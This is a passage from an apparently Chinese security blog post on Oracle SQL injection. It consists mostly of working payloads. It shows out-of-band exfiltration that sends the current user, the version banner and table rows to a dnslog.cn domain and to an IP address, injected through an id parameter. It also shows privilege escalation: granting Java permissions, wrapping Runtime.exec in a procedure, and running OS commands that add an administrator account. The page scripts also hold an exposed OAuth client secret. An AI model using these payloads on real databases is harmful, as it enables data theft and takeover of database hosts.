<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name<span class="operator">=</span><span class="string">&#x27;UTL_HTTP&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST(<span class="string">&#x27;http://oracle.zcv76n.dnslog.cn?data=xxx&#x27;</span>) <span class="keyword">FROM</span> DUAL  <span class="operator">/</span><span class="operator">/</span>需要网络访问权限</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.GET_HOST_ADDRESS(<span class="string">&#x27;oracle.zcv76n.dnslog.cn&#x27;</span>) <span class="keyword">FROM</span> DUAL </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> SYS.DBMS_LDAP.INIT(<span class="string">&#x27;oracle.zcv76n.dnslog.cn&#x27;</span>, <span class="number">9000</span>) <span class="keyword">FROM</span> DUAL </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST(<span class="string">&#x27;http://oracle.zcv76n.dnslog.cn?data=xxx&#x27;</span>) <span class="keyword">FROM</span> DUAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST(<span class="string">&#x27;http://172.16.12.187:9000/?data=&#x27;</span><span class="operator">||</span>SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>)) <span class="keyword">FROM</span> DUAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST(<span class="string">&#x27;http://172.16.12.187:9000/?data=&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> RAWTOHEX(banner) <span class="keyword">FROM</span> v$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>)) <span class="keyword">FROM</span> DUAL</span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST((<span class="keyword">SELECT</span> <span class="string">&#x27;http://172.16.12.187:9000/?data=&#x27;</span><span class="operator">||</span>OWNER <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> OWNER,ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(OWNER) <span class="keyword">FROM</span> SYS.ALL_TABLES)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)) <span class="keyword">FROM</span> DUAL</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> UTL_HTTP.REQUEST((<span class="keyword">SELECT</span> <span class="string">&#x27;http://172.16.12.187:9000/?data=&#x27;</span><span class="operator">||</span>DATA <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> RAWTOHEX(DATA), ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> id<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>name<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>age<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>sex <span class="keyword">AS</span> DATA <span class="keyword">FROM</span>  TEST.DEMO)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)) <span class="keyword">FROM</span> DUAL) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> </span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> UTL_HTTP.REQUEST((<span class="keyword">SELECT</span> <span class="string">&#x27;http://172.16.12.187:9000/?data=&#x27;</span><span class="operator">||</span>DATA <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> RAWTOHEX(DATA), ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> id<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>name<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>age<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>sex <span class="keyword">AS</span> DATA <span class="keyword">FROM</span>  TEST.DEMO)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.GET_HOST_ADDRESS(SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;.oracle.zcv76n.dnslog.cn&#x27;</span>) <span class="keyword">FROM</span> DUAL </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.GET_HOST_ADDRESS((<span class="keyword">SELECT</span> RAWTOHEX(banner)<span class="operator">||</span><span class="string">&#x27;.oracle.zcv76n.dnslog.cn&#x27;</span> <span class="keyword">FROM</span> v$version)) <span class="keyword">FROM</span> DUAL</span><br></pre></td></tr></table></figure>

<p><strong>开启ACL网络访问控制方法：</strong></p>
<p><strong>首先连接到超级用户</strong></p>
<ul>
<li><strong>创建 ACL</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line">dbms_network_acl_admin.create_acl (</span><br><span class="line">acl <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;UTL_INADDR.xml&#x27;</span>,</span><br><span class="line">description <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;utl_inaddr&#x27;</span>,</span><br><span class="line">principal <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;TEST&#x27;</span>,   <span class="comment">--此为将来要进行操作的用户</span></span><br><span class="line">is_grant <span class="operator">=</span><span class="operator">&gt;</span> <span class="literal">TRUE</span>,</span><br><span class="line">privilege <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;resolve&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>增加权限</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line">dbms_network_acl_admin.add_privilege (</span><br><span class="line">acl <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;UTL_INADDR.xml&#x27;</span>,</span><br><span class="line">principal <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;TEST&#x27;</span>,</span><br><span class="line">is_grant <span class="operator">=</span><span class="operator">&gt;</span> <span class="literal">TRUE</span>,</span><br><span class="line">privilege <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;connect&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>授予用户权限</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line">dbms_network_acl_admin.assign_acl(</span><br><span class="line">acl <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;UTL_INADDR.xml&#x27;</span>,</span><br><span class="line">host <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>

<p><strong>登录到TEST用户,即可以使用网络外带</strong></p>
<h2 id="Oracle-提权"><a href="#Oracle-提权" class="headerlink" title="Oracle 提权"></a>Oracle 提权</h2><p>SELECT * from session_privs;–查看权限 需要JAVA权限</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">    POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line">    <span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="string">&#x27;GRANT&#x27;</span>, <span class="string">&#x27;ZTZ&#x27;</span>, <span class="string">&#x27;SYS&#x27;</span>, <span class="string">&#x27;java.io.FilePermission&#x27;</span>, <span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>, <span class="string">&#x27;execute&#x27;</span>, <span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line">    <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">OPEN</span> C1;</span><br><span class="line">    <span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line">    <span class="keyword">CLOSE</span> C1;</span><br><span class="line">    DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line">  <span class="keyword">END</span>; <span class="comment">--获取JAVA权限</span></span><br></pre></td></tr></table></figure>

<p>​    </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line"><span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="string">&#x27;GRANT&#x27;</span>, <span class="keyword">USER</span>(), <span class="string">&#x27;SYS&#x27;</span>, <span class="string">&#x27;java.lang.RuntimePermission&#x27;</span>,<span class="string">&#x27;writeFileDescriptor&#x27;</span>, <span class="string">&#x27;NULL&#x27;</span>, <span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">OPEN</span> C1;</span><br><span class="line"><span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line"><span class="keyword">CLOSE</span> C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">   POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line">   <span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="string">&#x27;GRANT&#x27;</span>, <span class="keyword">USER</span>(), <span class="string">&#x27;SYS&#x27;</span>, <span class="string">&#x27;java.lang.RuntimePermission&#x27;</span>,<span class="string">&#x27;readFileDescriptor&#x27;</span>, <span class="string">&#x27;NULL&#x27;</span>, <span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line">   <span class="keyword">BEGIN</span></span><br><span class="line">   <span class="keyword">OPEN</span> C1;</span><br><span class="line">   <span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line">   <span class="keyword">CLOSE</span> C1;</span><br><span class="line">   DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line">   <span class="keyword">END</span>; <span class="comment">--获得java.lang.RuntimePermission权限</span></span><br></pre></td></tr></table></figure>





<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">and</span> resolve java source named JAVACMD <span class="keyword">as</span></span><br><span class="line">import java.lang.<span class="operator">*</span>;</span><br><span class="line">import java.io.<span class="operator">*</span>;</span><br><span class="line">public class JAVACMD</span><br><span class="line">&#123;</span><br><span class="line">   public <span class="keyword">static</span> void execmd(String command) throws IOException</span><br><span class="line">   &#123;</span><br><span class="line">           Runtime.getRuntime().<span class="keyword">exec</span>(command);</span><br><span class="line">   &#125;</span><br><span class="line">      &#125;<span class="comment">--创建一个java class然后用procedure包装它进行调用</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">procedure</span> MYJAVACMD(command <span class="keyword">in</span> <span class="type">varchar</span>) <span class="keyword">as</span> <span class="keyword">language</span> java</span><br><span class="line">    name <span class="string">&#x27;JAVACMD.execmd(java.lang.String)&#x27;</span>;<span class="comment">--创建调用的包</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXEC</span> MYJAVACMD(<span class="string">&#x27;net user ka 123.com, /add&#x27;</span>);	 </span><br><span class="line">	 </span><br></pre></td></tr></table></figure>


<p>​     </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">AND</span> RESOLVE Java SOURCE NAMED &quot;JAVACMD&quot; <span class="keyword">AS</span></span><br><span class="line"></span><br><span class="line">import java.lang.<span class="operator">*</span>;</span><br><span class="line"></span><br><span class="line">import java.io.<span class="operator">*</span>;public class JAVACMD</span><br><span class="line"></span><br><span class="line">&#123;public <span class="keyword">static</span> void execCommand (String command) throws IOException</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().<span class="keyword">exec</span>(command);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;<span class="operator">/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">PROCEDURE</span> JAVACMDPROC (p_command <span class="keyword">IN</span> VARCHAR2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">LANGUAGE</span> JAVA</span><br><span class="line"></span><br><span class="line">NAME <span class="string">&#x27;JAVACMD.execCommand (java.lang.String)&#x27;</span>;<span class="operator">/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">exec</span> javacmdproc(<span class="string">&#x27;cmd.exe /c net user qingxin qingxin /add&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">exec</span> javacmdproc(<span class="string">&#x27;cmd.exe /c net localgroup administrators qingxin /add&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>​     </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">	 </span><br><span class="line"><span class="keyword">select</span> SYS.KUPP$PROC.CREATE_MASTER_PROCESS(<span class="string">&#x27;DBMS_SCHEDULER.create_program(&#x27;&#x27;myprog4&#x27;&#x27;,&#x27;&#x27;EXEC UTABLE&#x27;&#x27;,&#x27;&#x27;c:\WINDOWS\system32\cmd.exe /c dir &gt;&gt; c:\my4.txt&#x27;&#x27;,0,TRUE);&#x27;</span>) <span class="keyword">from</span> dual</span><br><span class="line">	 </span><br><span class="line"> <span class="keyword">select</span> SYS.KUPP$PROC.CREATE_MASTER_PROCESS(<span class="string">&#x27;DBMS_SCHEDULER.create_job(job_name =&gt; &#x27;&#x27;myjob4&#x27;&#x27;,program_name =&gt; &#x27;&#x27;myprog4&#x27;&#x27;,start_date =&gt; NULL,repeat_interval =&gt; NULL,end_date =&gt; NULL,enabled =&gt; TRUE,auto_drop =&gt; TRUE);&#x27;</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p>​<br>​     </p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/posts/4/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime" title="更新时间"></i>
              2022-01-23 22:22:33
            </span>
            
                  <span class="post-tags">
                    <i class="iconfont icon-tags" title="标签"></i>
                    
                    <span class="span--tag">
                      <a href="/tags/sql%E6%B3%A8%E5%85%A5/" title="sql注入">
                        <b>#</b> sql注入
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/posts/2/" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle%E7%9A%84%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="toc-text">Oracle的基础操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8"><span class="toc-text">Oracle的系统表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="toc-text">数据库信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96%E6%9F%A5%E8%AF%A2"><span class="toc-text">带外查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle-%E5%A4%96%E5%B8%A6"><span class="toc-text">Oracle 外带</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle-%E6%8F%90%E6%9D%83"><span class="toc-text">Oracle 提权</span></a>
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        




  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
  <script src="/js/src/md5.min.js"></script>
  <div id="gitalk-container"></div>

  <script>
    const gitalk = new Gitalk({
      clientID: 'a8912b1aa74ebdeb8ecf',
      clientSecret: '2e09f32571113ed72c6902713871ee0702291593',
      repo: 'bstark',
      owner: 'bbbstark',
      admin: ['bbbstark'],
      id: location.pathname,
      distractionFreeMode: false
    })

    gitalk.render('gitalk-container')
  </script>


      </div>
    
  </div>


        <div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/bbbstark">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="email" href="">
            <i class="iconfont icon-envelope"></i>
          </a>
        </li>
      
        <li>
          <a title="facebook" href="">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        </li>
      
        <li>
          <a title="twitter" href="">
            <i class="iconfont icon-twitter"></i>
          </a>
        </li>
      
        <li>
          <a title="wechat" href="">
            <i class="iconfont icon-wechat"></i>
          </a>
        </li>
      
        <li>
          <a title="weibo" href="">
            <i class="iconfont icon-weibo"></i>
          </a>
        </li>
      
        <li>
          <a title="rss" href="/atom.xml">
            <i class="iconfont icon-rss"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    <div class="footer-more">
      
        <a href="https://bstark.me">Copyright © Bstark 2021</a>
        
    </div>
  
    <div class="footer-more">
      
        Theme by Oranges | Powered by Hexo
        
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="search...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' +  + '&url=' + https%3A%2F%2Fbstark.me%2Fposts%2F3%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://bstark.me/posts/3/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
